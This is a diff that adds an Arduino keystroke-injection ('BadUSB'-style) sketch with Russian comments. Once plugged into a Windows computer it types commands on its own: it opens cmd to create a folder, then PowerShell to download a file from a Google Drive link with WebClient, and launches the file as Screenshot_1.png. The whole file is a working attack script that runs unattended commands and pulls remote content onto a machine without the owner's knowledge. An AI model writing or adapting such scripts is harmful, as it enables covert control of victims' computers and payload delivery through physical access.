@@ -1,0 +1,71 @@
+#include <Keyboard.h>
+void setup(){
+    Keyboard.begin();
+    delay(2000);
+    createFolder();
+    getFiles();
+    
+}
+void loop(){}
+void winPlusR() {
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    delay(145);
+    Keyboard.releaseAll();
+    delay(100);
+}
+void createFolder(){
+    winPlusR();
+    // запусаем командную строку
+    Keyboard.println("cmd");
+    Keyboard.write(KEY_RETURN);
+    delay(2000);
+    // переходим надиск C:
+    Keyboard.println("cd C:/"); 
+    Keyboard.write(KEY_RETURN);
+    delay(1000);
+    // создаём папку "Downloads"
+    Keyboard.println("mkdir Downloads1"); 
+    Keyboard.write(KEY_RETURN);
+    delay(1000);
+    // закрываем окно
+    Keyboard.println("exit"); 
+    Keyboard.write(KEY_RETURN);
+    delay(2000);
+}
+
+void getFiles(){
+    winPlusR();
+    // открываем powershell
+    Keyboard.println("powershell"); 
+    Keyboard.write(KEY_RETURN);
+    delay(1000);
+    // переходим в папку Downloads
+    Keyboard.println("cd C:/Downloads1"); 
+    Keyboard.write(KEY_RETURN);
+    delay(250);
+    // задаём адрес для скачивания
+    Keyboard.println("$download_url = 'https://drive.usercontent.google.com/u/0/uc?id=1reF9dZT8EcVpAySvYfxgTv8lZdFKBzCD&export=download'"); 
+    Keyboard.write(KEY_RETURN);
+    delay(200);
+    // задаём локальный путь для сохранения файла
+    Keyboard.print("$local_path = 'C:/Downloads1/Screenshot_1.png'"); 
+    Keyboard.write(KEY_RETURN);
+    delay(200);
+    // запускаем веб клиент
+    Keyboard.println("$WebClient = New-Object System.Net.WebClient"); 
+    Keyboard.write(KEY_RETURN);
+    delay(500);
+    // качаем архив
+    Keyboard.println("$WebClient.DownloadFile($download_url, $local_path)");
+    Keyboard.write(KEY_RETURN);
+    delay(1000);
+    //open screen
+    Keyboard.println("start Screenshot_1.png");
+    Keyboard.write(KEY_RETURN);
+    delay(250);
+    // закрываем окно
+    Keyboard.println("exit"); 
+    Keyboard.write(KEY_RETURN);
+    delay(1000);
+}
